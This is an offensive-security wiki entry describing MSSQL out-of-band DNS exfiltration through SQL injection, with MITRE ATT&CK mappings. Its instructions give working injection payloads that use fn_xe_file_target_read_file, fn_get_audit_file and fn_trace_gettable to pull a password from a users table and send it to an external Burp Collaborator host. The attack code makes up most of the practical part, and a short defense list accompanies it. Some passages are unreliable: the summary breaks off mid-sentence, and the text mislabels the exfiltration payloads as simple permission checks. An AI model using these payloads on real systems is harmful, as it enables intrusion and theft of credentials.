---
id: 63683652-3eab-43b0-8822-ecdecc44906c
name: MSSQL Out of Band DNS Exfiltration
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:34.011716+00:00'
updated_at: '2023-04-10T20:22:40.512882+00:00'
tactics:
- '[[Command and Control|TA0011 - Command and Control]]'
- '[[Exfiltration|TA0010 - Exfiltration]]'
techniques:
- '[[Data Encoding|T1132 - Data Encoding]]'
- '[[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative
  Protocol]]'
- '[[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]'
tags:
- '[[MSSQL DNS exfiltration]]'
- '[[MSSQL Injection]]'
- '[[MSSQL Out of band]]'
commands:
- '[[Check if fn_get_audit_file is accessible]]'
- '[[Check if fn_trace_gettable is accessible]]'
- '[[Check if fn_xe_file_target_read_file is accessible]]'
---

# MSSQL Out of Band DNS Exfiltration

## Summary

MSSQL Out of Band DNS exfiltration is a technique used during MSSQL injection attacks to exfiltrate data through DNS queries. This technique allows an attacker to bypass traditional network security measures such as firewalls and proxies. The attacker can use this technique to exfiltrate data from 

## Description

# Description

MSSQL Out of Band DNS exfiltration is a technique used during MSSQL injection attacks to exfiltrate data through DNS queries. This technique allows an attacker to bypass traditional network security measures such as firewalls and proxies. The attacker can use this technique to exfiltrate data from the victim's network without being detected. The attacker can use the MSSQL injection vulnerability to inject a DNS query into the database server. The DNS query will contain the exfiltrated data. The DNS query will be sent to the attacker's DNS server, which will respond with the exfiltrated data. This technique can be used to exfiltrate sensitive data such as usernames, passwords, and other confidential information. The technique is called 'out of band' because the exfiltration occurs outside of the normal communication channels between the victim and the attacker.

## Requirements

1. Access to the victim's network

1. MSSQL injection vulnerability

1. Access to a DNS server controlled by the attacker

## Defense

1. Implement input validation to prevent MSSQL injection attacks

1. Monitor DNS traffic for suspicious activity

1. Implement network segmentation to limit the attacker's ability to move laterally within the network

## Objectives

1. Exfiltrate sensitive data from the victim's network

1. Bypass traditional network security measures such as firewalls and proxies

# Instructions

1. To check for file read and audit access, run the following commands:

For VIEW SERVER STATE permission:
1 and exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))

For CONTROL SERVER permission:
1 (select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default)))
1 and exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))

**Code**: [[# Permissions: Requires VIEW SERVER STATE permissi]]

> These commands are used to check for file read and audit access on a server. The first command checks for VIEW SERVER STATE permission and the second command checks for CONTROL SERVER permission. The commands use the fn_xe_file_target_read_file, fn_get_audit_file, and fn_trace_gettable functions to perform the checks. The commands use a Burp Collaborator server to send the results of the checks. The commands return a value of 1 if the server has the required permission and 0 otherwise.

**Command** ([[Check if fn_xe_file_target_read_file is accessible]]):

```bash
exists(select * from fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.xem',null,null))
```

**Command** ([[Check if fn_get_audit_file is accessible]]):

```bash
select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default))
```

**Command** ([[Check if fn_trace_gettable is accessible]]):

```bash
exists(select * from fn_trace_gettable('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\1.trc',default))
```

## MITRE ATT&CK Mapping

### Tactics

- [[Command and Control|TA0011 - Command and Control]]
- [[Exfiltration|TA0010 - Exfiltration]]

### Techniques

- [[Data Encoding|T1132 - Data Encoding]]
- [[Exfiltration Over Alternative Protocol|T1048 - Exfiltration Over Alternative Protocol]]
- [[Standard Application Layer Protocol|T1071 - Standard Application Layer Protocol]]

## Commands Used

- [[Check if fn_get_audit_file is accessible]]
- [[Check if fn_trace_gettable is accessible]]
- [[Check if fn_xe_file_target_read_file is accessible]]

## Tags

- [[MSSQL DNS exfiltration]]
- [[MSSQL Injection]]
- [[MSSQL Out of band]]
